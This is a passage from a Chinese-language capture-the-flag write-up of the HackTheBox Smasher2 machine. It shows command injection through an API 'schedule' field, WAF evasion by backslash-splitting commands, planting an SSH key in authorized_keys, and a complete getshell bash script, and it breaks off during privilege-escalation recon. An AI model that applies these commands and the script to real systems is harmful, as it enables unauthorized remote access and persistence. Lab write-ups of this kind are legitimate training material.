<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;authenticated&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;result&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;creation_date&quot;</span>: 1577435021,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/&lt;api_key&gt;/job&quot;</span>,</span><br><span class="line">        <span class="string">&quot;key&quot;</span>: <span class="string">&quot;fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当得到一个shell时，查看源代码，发现它试图将用户名和密码设置为无法猜测的值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">login = [<span class="string">&quot;Administrator&quot;</span>, <span class="string">&quot;SuperSecretAdminPWD123!&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>但是该用户名/密码组合无效，因为从未检查第二项。</p>
<ul>
<li>API执行</li>
</ul>
<p>现在有了api密钥，转到/api。 给的/api路径的代码显示可以运行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@app.route(<span class="string">&quot;/api/&lt;key&gt;/job&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def job(key):</span><br><span class="line">    ret = &#123;<span class="string">&quot;success&quot;</span>: None, <span class="string">&quot;result&quot;</span>: None&#125;</span><br><span class="line">    manager = safe_get_manager(session[<span class="string">&quot;id&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> manager.secret_key == key:</span><br><span class="line">        data = request.get_json(silent=True)</span><br><span class="line">        <span class="keyword">if</span> data and <span class="built_in">type</span>(data) == dict:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;schedule&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                out = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, data[<span class="string">&quot;schedule&quot;</span>]])</span><br><span class="line">                ret[<span class="string">&quot;success&quot;</span>] = True</span><br><span class="line">                ret[<span class="string">&quot;result&quot;</span>] = out</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret[<span class="string">&quot;success&quot;</span>] = False</span><br><span class="line">                ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Missing schedule parameter.&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret[<span class="string">&quot;success&quot;</span>] = False</span><br><span class="line">            ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Invalid value provided.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret[<span class="string">&quot;success&quot;</span>] = False</span><br><span class="line">        ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Invalid token.&quot;</span></span><br><span class="line">    <span class="built_in">return</span> jsonify(ret)</span><br></pre></td></tr></table></figure>

<p>需要发布json数据，并在其中包含一个关键时间表，该值是我要运行的值。<br>还在顶部看到一个会话检查，因此，我还将包括从Burp提取的会话cookie。</p>
<ul>
<li>运行失败</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;id&quot;&#125;&#x27;</span></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;403 Forbidden&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You don<span class="string">&#x27;t have permission to access /api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job</span></span><br><span class="line"><span class="string">on this server.&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at wonderfulsessionmanager.smasher2.htb Port 80&lt;/address&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>-s 允许在没有状态栏的情况下传递结果；<br>-H “Cookie: session=eyJp …” 添加会话cookie；<br>-H “Content-Type: application/json” 告诉服务器将POST数据作为json处理；<br>http：//wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job是登录后给出的网址；<br>–data ‘{“schedule”:”id”}’ 是要尝试运行命令ID。</p>
<ul>
<li>存在waf</li>
</ul>
<p>在代码中看不到403禁止访问。 如果密钥不匹配，我应该得到200和json，表示成功为False。 这使我认为可能存在WAF阻止请求。<br>开始使用不同的命令，以了解可以完成的工作。 id很小，但是w呢？ 它返回结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;w&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot; 09:40:47 up  3:24,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>好的，回到id，我可以在字符串中添加一些WAF规则以通过它吗？ 此链接具有一些良好的WAF规则。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb10.jpg"></p>
<p>发现了2种通过WAF执行命令的方法，包括’’和\来分解字符。</p>
<h3 id="得到user-txt"><a href="#得到user-txt" class="headerlink" title="得到user.txt"></a>得到user.txt</h3><p>使用此命令来检查home目录-只有一个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;l\\s /home/&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;dzonerzy\n&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>帅的掉渣，接下来依法炮制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;l\\s -\\l\\a /home/dzonerzy/&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;total 44\ndrwxr-xr-x 6 dzonerzy dzonerzy 4096 Feb 17  2019 .\ndrwxr-xr-x 3 root     root     4096 Feb 15  2019 ..\nlrwxrwxrwx 1 dzonerzy dzonerzy    9 Feb 15  2019 .bash_history -&gt; /dev/null\n-rw-r--r-- 1 dzonerzy dzonerzy  220 Feb 15  2019 .bash_logout\n-rw-r--r-- 1 dzonerzy dzonerzy 3799 Feb 16  2019 .bashrc\ndrwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .cache\ndrwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .gnupg\ndrwx------ 5 dzonerzy dzonerzy 4096 Feb 17  2019 .local\n-rw-r--r-- 1 dzonerzy dzonerzy  807 Feb 15  2019 .profile\n-rw-r--r-- 1 root     root      900 Feb 16  2019 README\ndrwxrwxr-x 4 dzonerzy dzonerzy 4096 Dec 27 08:56 smanager\n-rw-r----- 1 root     dzonerzy   33 Feb 17  2019 user.txt\n&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>读取user.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;ca\\t /home/dzonerzy/user.txt&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;91a13e3*************************\n&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
<p><font color="red">为防止有人把flag拿来乱提交，故将flag打码</font></p>
<h3 id="SSH密钥投毒"><a href="#SSH密钥投毒" class="headerlink" title="SSH密钥投毒"></a>SSH密钥投毒</h3><p>我无法通过WAF获得类似我的IP地址的任何信息，所以偶然发现了一些战术。 已经在dzonerzy的主目录中。 将创建一个.ssh目录，然后上传一个密钥。<br>创建目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;mk\\dir /home/dzonerzy/.ss\\h&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>base64加密密钥并将其写入/tmp：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># base64 -w0 /root/.ssh/id_rsa.pub</span></span><br><span class="line">c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDOXAvYnM5c1VkeFBZeUcrQWxaVnR1ais3d3BWREFoNmpySWRVeEl4N2MrK2NldEcvdU9ZMVIyZkozTDlIQ2dqazVXRkFpTVFsMmVYVnRtdHdWRGFYN1BpdzlSek1EV05RZW9YbUt6M0l5UFcyNzJpVVN4d2Q1TTd1ZVRpdTNnSlc0U1pmTWZITi84bjZ5clNDV25qZnFPaDN2aGdWTmx0ZmFicnRRSjVPQTR3S1BTcFZHVHNMT3psUCtjNEFmWjEyNVp6RVdOU0J1WG9GaCtLUUpsUWdwY1pkN1NDVVVEWnZBdGQ4b3BaR1pib0VidzJnemdhQUQrMkZIOGxrejJHOGc2VDhtSWVyRnl2enpvSmxpVU14Q3U0U0huQ1FnVThCQjYzdThlaTFoSXk2M0hPZVkycjd5VjU2Rmd5MVNXdDN0ZVl4THk5b1FyaFVsKzJjWTRoUDFXNy95dDJwSHRyQ1Rma3M0RDFtS1o5UlJrNlJTaTc0UmtGQkVUMkExYk9ISmZtTzYxQVN4UnlZeWhPQzVzYW0yZ2F5VS9IaHIrVUtuY0crb2JXMWpGRlR4NlFoUFBuVEdjVnJVQXQ0bnY5OUdiUVh3Z2pxOFlPL0tMT091Q3Q0Z2pDYnk4NVF0b1dlZnBvTWZSTUJoSXFZZ2pvQ0RuTEVsQkc5YWZqMVJiT2M9IHJvb3RAa2FsaQo=</span><br></pre></td></tr></table></figure>
<p>写入成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;echo \&quot;c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDOXAvYnM5c1VkeFBZeUcrQWxaVnR1ais3d3BWREFoNmpySWRVeEl4N2MrK2NldEcvdU9ZMVIyZkozTDlIQ2dqazVXRkFpTVFsMmVYVnRtdHdWRGFYN1BpdzlSek1EV05RZW9YbUt6M0l5UFcyNzJpVVN4d2Q1TTd1ZVRpdTNnSlc0U1pmTWZITi84bjZ5clNDV25qZnFPaDN2aGdWTmx0ZmFicnRRSjVPQTR3S1BTcFZHVHNMT3psUCtjNEFmWjEyNVp6RVdOU0J1WG9GaCtLUUpsUWdwY1pkN1NDVVVEWnZBdGQ4b3BaR1pib0VidzJnemdhQUQrMkZIOGxrejJHOGc2VDhtSWVyRnl2enpvSmxpVU14Q3U0U0huQ1FnVThCQjYzdThlaTFoSXk2M0hPZVkycjd5VjU2Rmd5MVNXdDN0ZVl4THk5b1FyaFVsKzJjWTRoUDFXNy95dDJwSHRyQ1Rma3M0RDFtS1o5UlJrNlJTaTc0UmtGQkVUMkExYk9ISmZtTzYxQVN4UnlZeWhPQzVzYW0yZ2F5VS9IaHIrVUtuY0crb2JXMWpGRlR4NlFoUFBuVEdjVnJVQXQ0bnY5OUdiUVh3Z2pxOFlPL0tMT091Q3Q0Z2pDYnk4NVF0b1dlZnBvTWZSTUJoSXFZZ2pvQ0RuTEVsQkc5YWZqMVJiT2M9IHJvb3RAa2FsaQo=\&quot; &gt; /tmp/luci&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>现在解码密钥并存储在authorized_keys中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;ba\\se\\64 -\\d /tmp/luci &gt;&gt; /home/dzonerzy/.ss\\h/autho\\rized_k\\eys&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>现在可以连接了，帅炸了。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Fri Dec 27 10:38:23 2019 from 10.10.14.10</span><br><span class="line">dzonerzy@smasher2:~$ id</span><br><span class="line">uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span><br><span class="line">dzonerzy@smasher2:~$ whoami</span><br><span class="line">dzonerzy</span><br><span class="line">dzonerzy@smasher2:~$</span><br></pre></td></tr></table></figure>

<p>还可以写成一键getshell的脚本如下所示，然后运行，非常的牛批：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cookie=$(curl -s -I  http://wonderfulsessionmanager.smasher2.htb/ | grep <span class="string">&quot;Set-Cookie&quot;</span> | cut -d<span class="string">&#x27;;&#x27;</span> -f1 | cut -d= -f2)</span><br><span class="line">ssh_pub_b64=$(cat /root/.ssh/id_rsa.pub | base64 -w0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Upload base64 encoded key</span></span><br><span class="line">curl -s -H <span class="string">&quot;Cookie: session=<span class="variable">$cookie</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="string">&#x27;&#123;&quot;schedule&quot;:&quot;echo    \&quot;&#x27;</span><span class="variable">$ssh_pub_b64</span><span class="string">&#x27;\&quot; &gt; /tmp/df&quot;&#125;&#x27;</span> | grep -q <span class="literal">true</span> || &#123; <span class="built_in">echo</span> <span class="string">&quot;[-] Failed to upload public key to /tmp&quot;</span>; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Uploaded base64-encoded public key to /tmp/df&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make .ssh directory</span></span><br><span class="line">curl -s -H <span class="string">&quot;Cookie: session=<span class="variable">$cookie</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="string">&#x27;&#123;&quot;schedule&quot;:         &quot;mk\\dir -\\p /home/dzonerzy/.ss\\h&quot;&#125;&#x27;</span> | grep -q <span class="literal">true</span> || &#123; <span class="built_in">echo</span> <span class="string">&quot;[-] Failed to make /home/dzonerzy/.ssh directory&quot;</span>;  <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Created .ssh directory&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decode Key</span></span><br><span class="line">curl -s -H <span class="string">&quot;Cookie: session=<span class="variable">$cookie</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="string">&#x27;&#123;&quot;schedule&quot;:&quot;base64 -\\d /tmp/df &gt; /home/dzonerzy/.ss\\h/auth\\orized_keys&quot;&#125;&#x27;</span> | grep -q <span class="literal">true</span> || &#123; <span class="built_in">echo</span> <span class="string">&quot;[-] Failed to decode key into authorized_keys&quot;</span>; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Decoded public key into authorized_keys file&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Delete tmp file</span></span><br><span class="line">curl -s -H <span class="string">&quot;Cookie: session=<span class="variable">$cookie</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="string">&#x27;&#123;&quot;schedule&quot;:&quot;rm /tmp/df&quot;&#125;&#x27;</span> | grep -q <span class="literal">true</span> || <span class="built_in">echo</span> <span class="string">&quot;[-] Failed to delete encoded key from tmp. Manually rm /tmp/df&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;[+] SSH with the following command:\nssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./smasher2.sh </span></span><br><span class="line">[+] Uploaded base64-encoded public key to /tmp/df</span><br><span class="line">[+] Created .ssh directory</span><br><span class="line">[+] Decoded public key into authorized_keys file</span><br><span class="line">[+] SSH with the following <span class="built_in">command</span>:</span><br><span class="line">ssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135</span><br><span class="line">root@kali:~<span class="comment"># ssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Fri Dec 27 10:38:23 2019 from 10.10.14.10</span><br><span class="line">dzonerzy@smasher2:~$ id</span><br><span class="line">uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span><br><span class="line">dzonerzy@smasher2:~$ whoami</span><br><span class="line">dzonerzy</span><br><span class="line">dzonerzy@smasher2:~$ </span><br></pre></td></tr></table></figure>

<h4 id="提权：dzonerzy-–-gt-root"><a href="#提权：dzonerzy-–-gt-root" class="headerlink" title="提权：dzonerzy –&gt; root"></a>提权：dzonerzy –&gt; root</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ cat README </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         .|<span class="string">&#x27;&#x27;</span><span class="string">&#x27;.|                            &#x27;</span>||                      </span><br><span class="line">         ||..  <span class="string">&#x27;  .. .. ..    ....    ....   || ..     ....  ... ..  </span></span><br><span class="line"><span class="string">          &#x27;</span><span class="string">&#x27;|||.   || || ||  &#x27;</span><span class="string">&#x27; .||  ||. &#x27;</span>   ||<span class="string">&#x27; ||  .|...||  ||&#x27;</span> <span class="string">&#x27;&#x27;</span> </span><br><span class="line">        .     <span class="string">&#x27;||  || || ||  .|&#x27;</span> ||  . <span class="string">&#x27;|..  ||  ||  ||       ||     </span></span><br><span class="line"><span class="string">        |&#x27;</span>....|<span class="string">&#x27;  .|| || ||. &#x27;</span>|..<span class="string">&#x27;|&#x27;</span> |<span class="string">&#x27;..|&#x27;</span> .||. ||.  <span class="string">&#x27;|...&#x27;</span> .||.    v2.0 </span><br><span class="line">                                                             </span><br><span class="line">                                                        by DZONERZY </span><br><span class="line"></span><br><span class="line">Ye you<span class="string">&#x27;ve come this far and I hope you&#x27;</span>ve learned something new, smasher wasn<span class="string">&#x27;t created</span></span><br><span class="line"><span class="string">with the intent to be a simple puzzle game... but instead I just wanted to pass my limited</span></span><br><span class="line"><span class="string">knowledge to you fellow hacker, I know it&#x27;</span>s not much but this time you<span class="string">&#x27;ll need more than</span></span><br><span class="line"><span class="string">skill, you will need to think outside the box to complete smasher 2 , have fun and happy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                       Hacking!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">free(knowledge);</span></span><br><span class="line"><span class="string">free(knowledge);</span></span><br><span class="line"><span class="string">* error for object 0xd00000000b400: pointer being freed was not allocated *</span></span><br></pre></td></tr></table></figure>

<p>给出提示说明提权需要自己写exp来通过内核内存溢出提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ find / -group adm 2&gt;/dev/null</span><br><span class="line">/var/spool/rsyslog</span><br><span class="line">/var/<span class="built_in">log</span>/apt/term.log</span><br><span class="line">/var/<span class="built_in">log</span>/syslog</span><br><span class="line">/var/<span class="built_in">log</span>/apache2</span><br><span class="line">/var/<span class="built_in">log</span>/apache2/access.log</span><br><span class="line">/var/<span class="built_in">log</span>/apache2/error.log</span><br><span class="line">/var/<span class="built_in">log</span>/apache2/other_vhosts_access.log</span><br><span class="line">/var/<span class="built_in">log</span>/kern.log</span><br><span class="line">/var/<span class="built_in">log</span>/auth.log</span><br></pre></td></tr></table></figure>

<p>通过访问auth.log，我可以查看sudo运行的不同命令。 日志行采用以下格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ strings /var/<span class="built_in">log</span>/auth.log | grep COMMAND | head -1</span><br><span class="line">Feb 15 21:58:48 smasher sudo: dzonerzy : TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get update</span><br></pre></td></tr></table></figure>
<p>使用bash-foo，可以在此日志中获得命令的列表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ strings /var/<span class="built_in">log</span>/auth.log | grep COMMAND | cut -d: -f5- | sort -u</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/chown root:root banner</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/su</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/systemctl <span class="built_in">enable</span> rc.local.service</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get update</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get upgrade</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt install apache2 python-pip</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/id</span><br><span class="line"> TTY=unknown ; PWD=/ ; USER=dzonerzy ; COMMAND=/bin/bash -c <span class="built_in">cd</span> /home/dzonerzy/smanager &amp;&amp; ./runner.py 2&gt;&amp;1 &gt; /dev/null &amp;</span><br><span class="line"> TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/sbin/insmod /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko</span><br><span class="line"> user NOT <span class="keyword">in</span> sudoers ; TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/id</span><br></pre></td></tr></table></figure>

<p>除了最后两个以外，其他似乎都在设置框。 倒数第二个启动以dzonerzy运行的Web服务器。 最后一个很有趣。<br>如果我在二进制文件上运行字符串，则会得到以下信息：</p>
